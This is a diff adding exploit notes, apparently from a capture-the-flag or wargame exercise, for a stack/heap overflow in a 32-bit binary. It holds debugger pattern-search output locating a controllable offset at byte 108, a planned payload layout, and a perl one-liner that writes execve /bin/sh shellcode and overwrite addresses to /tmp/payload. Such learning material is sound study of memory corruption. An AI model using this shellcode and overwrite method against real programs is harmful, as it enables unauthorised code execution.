@@ -2,3 +2,43 @@ Address called : $edx = 0x804873a ->
 Argument copied here : 0x804ebb4
 
 Successfully overflowed with a 200 bytes long argument
+
+Pattern search result :
+
+1: => 0x804867c <main+136>:	mov    eax,DWORD PTR [esp+0x10]
+[EAX] --> offset 0 - size ~200
+[ECX] --> offset 12 - size ~188
+[EDX] --> offset 0 - size ~200
+[EBX] --> offset 108 - size ~92
+
+2: => 0x8048680 <main+140>:	mov    eax,DWORD PTR [eax]
+[EAX] --> offset 108 - size ~92
+[ECX] --> offset 12 - size ~188
+[EDX] --> offset 0 - size ~200
+[EBX] --> offset 108 - size ~92
+
+3: => 0x8048682 <main+142>:	mov    edx,DWORD PTR [eax]
+EAX+0 found at offset: 108
+Registers point to pattern buffer:
+[ECX] --> offset 12 - size ~188
+[EDX] --> offset 0 - size ~200
+[EBX] --> offset 108 - size ~92
+
+
+
+                                                                                                             ---- SEGV because deref this
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AA____AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+
+Deref byte 108
+
+Payload :
+
+0x804a00c + 108 + 4 = 0x804a07C
+
+[shellcode][offset_to byte number 108][0x804EC24 (address to 4 bytes after)][0x804ebb4 (address to shellcode)]
+
+ perl -e 'print
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+  . "D"x63
+  . "\x7c\xa0\x04\x08\x0c\xa0\x04\x08"
+  ' > /tmp/payload
